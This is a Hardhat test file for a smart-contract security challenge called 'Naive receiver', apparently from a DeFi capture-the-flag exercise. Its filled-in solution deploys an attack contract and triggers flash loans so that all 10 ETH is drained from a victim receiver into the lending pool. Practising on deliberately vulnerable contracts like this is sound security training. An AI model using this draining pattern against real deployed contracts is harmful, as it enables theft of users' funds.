import { ethers } from 'hardhat';
import { expect } from 'chai';

describe('[Challenge] Naive receiver', function () {
  it('should take all ETH out of the user’s contract', async function () {
    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = 1000n * 10n ** 18n;

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = 10n * 10n ** 18n;

    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    const [deployer, user, player] = await ethers.getSigners();

    const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
    const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

    const pool = await LenderPoolFactory.deploy();
    await deployer.sendTransaction({ to: pool, value: ETHER_IN_POOL });
    const ETH = await pool.ETH();

    expect(await ethers.provider.getBalance(pool)).to.be.equal(ETHER_IN_POOL);
    expect(await pool.maxFlashLoan(ETH)).to.eq(ETHER_IN_POOL);
    expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n);

    const receiver = await FlashLoanReceiverFactory.deploy(pool);
    await deployer.sendTransaction({ to: receiver, value: ETHER_IN_RECEIVER });
    await expect(receiver.onFlashLoan(deployer, ETH, ETHER_IN_RECEIVER, 10n ** 18n, '0x')).to.be.reverted;
    expect(await ethers.provider.getBalance(receiver)).to.eq(ETHER_IN_RECEIVER);

    /** CODE YOUR SOLUTION HERE */
    const ExploiterFactory = await ethers.getContractFactory('NaiveReceiverAttack', deployer);
    const exploiter = await ExploiterFactory.deploy(pool, receiver);
    await pool.flashLoan(exploiter, ETH, 10n ** 18n, '0x');

    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // All ETH has been drained from the receiver
    expect(await ethers.provider.getBalance(receiver)).to.be.equal(0);
    expect(await ethers.provider.getBalance(pool)).to.be.equal(ETHER_IN_POOL + ETHER_IN_RECEIVER);
  });
});
